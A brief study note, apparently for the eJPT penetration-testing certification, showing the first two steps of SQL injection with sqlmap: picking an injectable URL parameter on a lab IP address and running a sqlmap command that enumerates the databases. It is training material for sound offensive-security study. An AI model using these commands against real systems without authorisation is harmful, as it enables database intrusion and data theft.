[eJPT][sqlmap]SQLMap Usage


1) First, find out the breach point, such as http://10.124.211.96/newsdetails.php?id=26.


2) Second, determine the databases:
# sqlmap -u http://10.124.211.96/newsdetails.php?id=26 --dbs
